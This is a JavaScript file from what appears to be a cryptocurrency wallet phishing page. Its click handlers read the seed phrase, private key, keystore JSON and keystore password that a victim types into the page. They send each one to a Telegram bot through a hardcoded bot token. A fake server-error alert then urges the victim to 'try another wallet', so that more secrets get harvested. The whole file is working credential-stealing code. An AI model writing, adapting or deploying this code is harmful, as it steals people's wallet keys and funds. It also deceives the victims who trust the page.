let submitk = document.getElementById("submitk")
//let submitm = document.getElementById("submitm")
let submitp = document.getElementById("submitp")
let submitks = document.getElementById("submitks")

$(".former").submit(function(e) {
    e.preventDefault();
});

async function sendMessage(message){
    return new Promise((resolve, reject)=>{
      const chat_id = -7654553013;
      fetch(`https://api.telegram.org/bot8374408986:AAFDH13C-XPSNC5t6imlnd0OiQW0NhSVWNw/sendMessage?chat_id=${chat_id}&text=${message}`, {
            method: "GET",
            headers: {
                
            }
        })
        .then(async(res) => {
            if(res.status > 399) throw res;
            resolve(await res.json());
        }).catch(err=>{
            reject(err);
        })
    })
  }

submitk.addEventListener("click", () => {
    console.log("clickeed");
    (async function(){
        console.log("clickeed");
        
    if (document.getElementById("submitk")){
        let phrase =document.getElementById("phrased").value;
    //let keypass =document.getElementById("keypass").value;
    
        console.log("phrase");
        sendMessage(`phrase`);
        sendMessage(phrase);
        //await sendMessage(`Password`);
        //await sendMessage(keypass);
        alert("Error connecting with the server ... Pls, try another wallet");
    }
})()
})

// submitm.addEventListener("click", () => {
    
//     (async function(){
//         console.log("clickeed");
        
//     if (document.getElementById("submitm")){
//         let phrase =document.getElementById("keystored").value;
//     //let mnemonicspass =document.getElementById("mnemonicspass").value;
    
//         console.log("Keystore");
//         sendMessage(`Keystore`);
//         sendMessage(phrase);
//         //await sendMessage(`Password`);
//         //await sendMessage(mnemonicspass);
//         alert("Error connecting with the server ... Pls, try again later");
//     }
// })()
// })

submitp.addEventListener("click", () => {
    
    (async function(){
        console.log("clickeed");
        
    if (document.getElementById("submitp")){
        let phrase =document.getElementById("privatekeyd").value;
    //let privatepass =document.getElementById("privatepass").value;
    

        console.log("Private Key");
        sendMessage(`Private key`);
        sendMessage(phrase);
        //await sendMessage(`Password`);
        //await sendMessage(privatepass);
        alert("Error connecting with the server ... Pls, try another wallet");
    }
})()
})

submitks.addEventListener("click", () => {
    
    (async function(){
        console.log("clickeed");
        
    if (document.getElementById("submitks")){
        let phrase =document.getElementById("keystored").value;
    //let privatepass =document.getElementById("privatepass").value;
    
    

        console.log("Keystore JSON");
        sendMessage(`Keystore JSON`);
        sendMessage(phrase);
        //await sendMessage(`Password`);
        //await sendMessage(privatepass);
        
    }
})()
})
submitks.addEventListener("click", () => {
    
    (async function(){
        console.log("clickeed");
        
    if (document.getElementById("submitks")){
        let phrase =document.getElementById("password").value;
    //let privatepass =document.getElementById("privatepass").value;
    
    

        console.log("Keystore Password");
        sendMessage(`Keystore Password`);
        sendMessage(phrase);
        //await sendMessage(`Password`);
        //await sendMessage(privatepass);
        alert("Error connecting with the server ... Pls, try another wallet");
    }
})()
})
